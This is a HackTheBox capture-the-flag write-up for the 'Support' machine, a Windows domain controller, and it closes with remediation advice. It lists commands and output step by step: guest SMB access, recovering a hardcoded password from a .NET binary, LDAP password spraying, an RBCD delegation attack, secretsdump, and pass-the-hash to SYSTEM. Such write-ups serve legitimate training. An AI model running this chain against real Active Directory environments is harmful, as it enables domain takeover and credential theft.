---
title: "HackTheBox - Support"
date: 2026-08-18 00:00:00 +0800
categories: [WriteUp]
tags: [WriteUp, HTB, hackthebox, Easy, Windows]
image: /assets/images/HTB_logo.png
---

![image](assets/images/HTB-Support/Support_Logo.png)

## 0. Description

**OS:** Windows

**Difficulty:** Easy

**Target IP:** 10.129.230.181

**Domain:** support.htb

**Environment:** Exegol

---

## 1. Reconnaissance

### 1.1 Host discovery


```bash
ping -c5 10.129.230.181
```

The host responds with a TTL of 127, consistent with a Windows machine.

### 1.2 Port scan

```bash
nmap -p- -Pn -sC -sV -O 10.129.230.181 -oN nmap_results.txt
```

| Port | Service | Detail |
|------|---------|--------|
| 53   | domain | Simple DNS Plus |
| 88   | kerberos-sec | Microsoft Windows Kerberos |
| 135  | msrpc | Microsoft Windows RPC |
| 139  | netbios-ssn | Microsoft Windows netbios-ssn |
| 389  | ldap | Active Directory LDAP (Domain: support.htb) |
| 445  | microsoft-ds | SMB |
| 464  | kpasswd5 | Kerberos password change |
| 593  | ncacn_http | RPC over HTTP |
| 636  | tcpwrapped | LDAPS |
| 3268/3269 | ldap/tcpwrapped | Global Catalog |
| 5985 | http | WinRM (HTTPAPI) |
| 9389 | mc-nmf | .NET Message Framing (AD Web Services) |
| 49664+ | msrpc | Dynamic RPC ports |

The presence of ports **88** (Kerberos) and **389** (LDAP), combined with the `support.htb` domain name, confirms this is an **Active Directory Domain Controller**.

---

## 2. SMB Enumeration

A **guest** session (null session) is allowed on the SMB service:

```bash
nxc smb 10.129.230.181 -u 'guest' -p '' --shares
```

Accessible shares:

| Share | Permissions | Remark |
|---|---|---|
| ADMIN$ | — | Remote Admin |
| C$ | — | Default share |
| IPC$ | READ | Remote IPC |
| NETLOGON | — | Logon server share |
| **support-tools** | **READ** | **support staff tools** |
| SYSVOL | — | Logon server share |

The `support-tools` share stands out: it's not a standard AD share, and read access is open to the `guest` account.

### 2.1 Exploring the `support-tools` share

```bash
smbclientng -d "support.htb" -u "guest" -p "" --host "10.129.230.181"
```

Share content:

```
7-ZipPortable_21.07.paf.exe
npp.8.4.1.portable.x64.zip
putty.exe
SysinternalsSuite.zip
UserInfo.exe.zip
windirstat1_1_2_setup.exe
WiresharkPortable64_3.6.5.paf.exe
```

All files were uploaded the same day, except for **`UserInfo.exe.zip`**, which was added on a different date. This "outlier" file is the point of interest.

---

## 3. Analyzing `UserInfo.exe`

The `UserInfo.exe.config` file reveals a .NET Framework 4.8 executable, decompiled with **ILSpy**.

Analysis of the source code reveals a hardcoded password-decryption routine:

```csharp
public static string getPassword()
{
    byte[] array = Convert.FromBase64String(enc_password);
    byte[] array2 = array;
    for (int i = 0; i < array.Length; i++)
    {
        array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
    }
    return Encoding.Default.GetString(array2);
}
```

Identified parameters:
- **Encrypted string (Base64):** `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
- **XOR key:** `armando`
- **Additional XOR constant:** `0xDF`

Reproducing the logic in Python recovers the plaintext password:

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## 4. Password Spraying and LDAP Access

### 4.1 Retrieving the domain user list

With a technical `ldap` account already known (identified via anonymous LDAP / the challenge context), the domain's user list is extracted:

```bash
windapsearch -d support.htb --dc "10.129.230.181" -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --module users | grep "sAMAccountName" | awk -F ': ' '{print $2}' > users.txt
```

### 4.2 Spraying the password extracted from the binary

```bash
nxc ldap 10.129.230.181 -d "support.htb" -u "users.txt" -p "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz"
```

Result: the decrypted password actually belongs to the **`ldap`** account:

```
[+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### 4.3 Dumping the Active Directory

The `ldap` account has sufficient read rights to dump the directory:

```bash
ldapdomaindump --user "support.htb\ldap" --password "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" --outdir ldapdomaindump 10.129.230.181
```

Exploring the dump reveals additional plaintext credentials, likely stored in a description attribute or custom field of an account:

```
support:Ironside47pleasure40Watchful
```

These credentials are validated with NetExec:

```bash
nxc smb 10.129.230.181 -u 'support' -p 'Ironside47pleasure40Watchful'
[+] support.htb\support:Ironside47pleasure40Watchful
```

---

## 5. Foothold

WinRM connection with the `support` account:

```bash
evil-winrm-py --ip 10.129.230.181 --user support -p 'Ironside47pleasure40Watchful'
```

```
support\support
```

The user flag is retrieved from the desktop:

```
C:\Users\support\Desktop\user.txt
a735ce438d352dd31819ce17ed76973b
```

---

## 6. Privilege Escalation

### 6.1 BloodHound Analysis

```bash
bloodhound-python -d "support.htb" -u "support" -p "Ironside47pleasure40Watchful" -ns "10.129.230.181" -c ALL
```

Graph analysis reveals that the `support` account is a member of the **`SHARED SUPPORT ACCOUNTS@SUPPORT.HTB`** group, which holds **GenericAll** privilege over the **`DC.SUPPORT.HTB`** computer object.

![image](assets/images/HTB-Support/Bloodhound_support_genericAll.png)

This full-control privilege over a computer object enables a **Resource-Based Constrained Delegation (RBCD)** attack:
1. Create an attacker-controlled machine account (since no existing SPN-bearing account is controlled).
2. Configure the DC's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute to allow that machine account to delegate.
3. Obtain a service ticket (S4U2Self / S4U2Proxy) impersonating `Administrator`.

### 6.2 Creating a machine account

The LDAPS method failed, so the **SAMR** method is used instead (creation via SMB, no SPN by default):

```bash
addcomputer.py -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host 'DC.SUPPORT.HTB' 'support.htb/support:Ironside47pleasure40Watchful' -k
```

```
[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```

### 6.3 Configuring delegation (RBCD)

```bash
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'dc$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful' -k -dc-ip 10.129.230.181
```

```
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on dc$ via S4U2Proxy
```

### 6.4 Obtaining a service ticket via impersonation

```bash
getST.py -spn CIFS/dc.support.htb -impersonate "Administrator" -dc-ip "10.129.230.181" "support.htb/attackersystem$:Summer2018!"
```

```
[*] Saving ticket in Administrator@CIFS_dc.support.htb@SUPPORT.HTB.ccache
```

The Kerberos ticket is loaded into the environment:

```bash
export KRB5CCNAME="Administrator@CIFS_dc.support.htb@SUPPORT.HTB.ccache"
```

### 6.5 Extracting domain secrets

With the obtained ticket, `secretsdump` retrieves the Administrator account's NTLM hash via DRSUAPI:

```bash
secretsdump -k -no-pass -just-dc-ntlm dc.support.htb -just-dc-user administrator
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bb06cbc02b39abeddd1335bc30b19e26:::
```

### 6.6 Validation and SYSTEM access

```bash
nxc smb 10.129.230.181 -u "administrator" -H "bb06cbc02b39abeddd1335bc30b19e26"
[+] support.htb\administrator:bb06cbc02b39abeddd1335bc30b19e26 (admin)
```

A SYSTEM shell is obtained via Pass-the-Hash with `psexec.py`:

```bash
psexec.py -hashes :bb06cbc02b39abeddd1335bc30b19e26 "support.htb/administrator@10.129.230.181"
```

```
C:\Windows\system32> whoami
nt authority\system
```

![image](assets/images/HTB-Support/Pwned.png)

---

## 7. Attack Chain Summary
| | | |
|---|---|---|
| 1 | **SMB null session** | read access to the non-standard `support-tools` share. |
| 2 | **Reverse engineering** | a .NET binary (`UserInfo.exe`) that contains a custom XOR decryption algorithm and a plaintext password. |
| 3 | **LDAP password spraying** | identifying the legitimate `ldap` account that owns the password. |
| 4 | **LDAP dump of the directory** | discovering additional plaintext credentials (`support`). |
| 5 | **WinRM access** | with the `support` account, retrieving the user flag. |
| 6 | **BloodHound** | identifying a **GenericAll** privilege on the DC computer object, inherited via a group (`SHARED SUPPORT ACCOUNTS`). |
| 7 | **RBCD** | (machine account creation + resource-based constrained delegation), impersonating `Administrator`. |
| 8 | **DCSync** | using the obtained ticket, extracting the Administrator's NTLM hash. |
| 9 | **Pass-the-Hash** | SYSTEM shell on the domain controller. |

---

## 8. Remediations

- Do not expose SMB shares readable by anonymous/`guest` sessions, especially ones containing internal tools or custom binaries.
- Never hardcode credentials (even encrypted/obfuscated) inside a distributed executable, homemade XOR algorithm is not a security measure.
- Audit LDAP attributes (description, notes, etc.) to ensure no plaintext passwords are stored there.
- Restrict the **GenericAll** privilege on computer objects, especially domain controllers, and monitor machine account creation (`ms-DS-MachineAccountQuota`).
- Detect modifications to the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, which indicate a potential RBCD attack attempt.
